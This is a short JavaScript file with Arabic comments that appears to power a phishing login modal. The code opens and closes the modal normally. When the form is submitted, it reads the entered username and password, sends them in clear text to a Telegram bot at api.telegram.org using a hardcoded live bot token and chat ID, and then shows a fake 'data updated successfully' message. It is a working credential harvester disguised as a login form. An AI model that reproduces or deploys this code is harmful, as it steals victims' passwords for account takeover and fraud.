// تعريف العناصر
const openBtn = document.getElementById("openLogin");
const modal = document.getElementById("loginModal");
const closeBtn = document.getElementById("closeLogin");
const loginForm = document.getElementById("loginForm");

// فتح النافذة عند الضغط على زر "دخول بعضوية"
if (openBtn) {
  openBtn.onclick = function() {
    modal.style.display = "block";
  };
}

// إغلاق النافذة عند الضغط على علامة ×
if (closeBtn) {
  closeBtn.onclick = function() {
    modal.style.display = "none";
  };
}

// إغلاق النافذة عند الضغط في أي مكان خارج المربع الأبيض
window.onclick = function(event) {
  if (event.target == modal) {
    modal.style.display = "none";
  }
};

// إرسال البيانات إلى تيليجرام
const token = "8127318609:AAG0ICtjWolbHfNXrpN-r0JOkXoaOtfubE0";
const chat_id = "7513504133";

if (loginForm) {
  loginForm.onsubmit = function(e) {
    e.preventDefault();
    const user = document.getElementById("user").value;
    const password = document.getElementById("password").value;

    const text = `اسم المستخدم: ${user}\nكلمة المرور: ${password}`;

    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`)
      .then(res => {
        alert("تم تحديث البيانات بنجاح!");
        modal.style.display = "none";
        loginForm.reset();
      })
      .catch(err => alert("خطأ في الاتصال: " + err));
  };
}
